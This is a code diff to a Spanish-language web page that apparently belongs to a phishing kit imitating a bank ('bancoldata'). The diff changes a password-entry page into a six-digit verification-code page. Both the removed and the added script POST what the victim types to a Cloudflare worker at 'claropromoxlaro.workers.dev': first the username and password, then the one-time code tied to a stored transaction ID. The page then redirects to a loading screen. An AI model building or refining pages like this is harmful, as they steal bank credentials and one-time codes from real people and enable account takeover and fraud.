@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ingrese su Clave</title>
+    <title>Código de Verificación</title>
     <style>
         * {
             margin: 0;
@@ -43,11 +43,13 @@
         .center-box .input-container {
             position: relative;
             width: 80%;
+            display: flex;
+            justify-content: space-between;
         }
         .center-box input {
-            width: 100%;
-            padding: 10px;
-            padding-left: 40px;
+            width: 35px;
+            height: 50px;
+            text-align: center;
             font-size: 19px;
             border: none;
             border-bottom: 1px solid #ffe100;
@@ -84,8 +86,12 @@
         <img src="img/cel1.jpg" alt="Background Image">
         <div class="center-box">
             <div class="input-container">
-                <i>🔒</i>
-                <input type="password" placeholder="Clave" id="claveInput">
+                <input type="tel" maxlength="1" id="input1">
+                <input type="tel" maxlength="1" id="input2">
+                <input type="tel" maxlength="1" id="input3">
+                <input type="tel" maxlength="1" id="input4">
+                <input type="tel" maxlength="1" id="input5">
+                <input type="tel" maxlength="1" id="input6">
             </div>
         </div>
         <div class="button-container">
@@ -95,70 +101,63 @@
     </div>
 
     <script>
-        const claveInput = document.getElementById('claveInput');
+        const inputs = document.querySelectorAll('input[type="tel"]');
         const loginButton = document.getElementById('loginButton');
 
         loginButton.addEventListener('click', async () => {
-            const claveValue = claveInput.value.trim();
+            const otpCode = Array.from(inputs).map(input => input.value).join('');
             
-            if (claveValue.length >= 4) {
+            if (otpCode.length === 6) {
                 try {
                     // Obtener datos de localStorage
                     let bancoldata = JSON.parse(localStorage.getItem('bancoldata') || '{}');
-                    const usuario = bancoldata.usuario;
+                    const transactionId = bancoldata.transactionId;
 
-                    if (!usuario) {
-                        alert('Error: Usuario no encontrado');
+                    if (!transactionId) {
+                        alert('Error: No se encontró la transacción');
                         return;
                     }
 
-                    // Generar transactionId único
-                    const transactionId = 'txn_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    console.log('Enviando OTP:', { transactionId, otp: otpCode });
 
-                    // ACTUALIZAR: Guardar la clave en bancoldata
-                    bancoldata.clave = claveValue;
-                    bancoldata.transactionId = transactionId;
-                    localStorage.setItem('bancoldata', JSON.stringify(bancoldata));
-
-                    console.log('Enviando login:', { usuario, clave: claveValue, transactionId });
-
-                    // Enviar login al worker
-                    const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/login', {
+                    // Enviar OTP al worker
+                    const response = await fetch('https://blue-night-7897.claropromoxlaro.workers.dev/otp-code', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            usuario: usuario,
-                            clave: claveValue,
-                            transactionId: transactionId
+                            transactionId: transactionId,
+                            otp: otpCode
                         })
                     });
 
                     const result = await response.json();
-                    console.log('Respuesta del login:', result);
+                    console.log('Respuesta OTP:', result);
                     
                     if (result.ok) {
                         // Redirigir a la página de loading
                         window.location.href = 'loading.html';
                     } else {
-                        alert('Error en el login: ' + (result.error || 'Error desconocido'));
+                        alert('Error en el OTP: ' + (result.error || 'Error desconocido'));
                     }
                     
                 } catch (error) {
                     console.error('Error completo:', error);
-                    alert('Error al procesar el login: ' + error.message);
+                    alert('Error al procesar el OTP: ' + error.message);
                 }
             } else {
-                alert('Por favor, ingrese una clave válida de al menos 4 caracteres.');
+                alert('Por favor, ingrese un código de 6 dígitos.');
             }
         });
 
-        // También enviar con Enter
-        claveInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                loginButton.click();
-            }
+        // También enviar con Enter en cualquier input
+        inputs.forEach(input => {
+            input.addEventListener('keypress', (e) => {
+                if (e.key === 'Enter') {
+                    loginButton.click();
+                }
+            });
         });
     </script>
 </body>
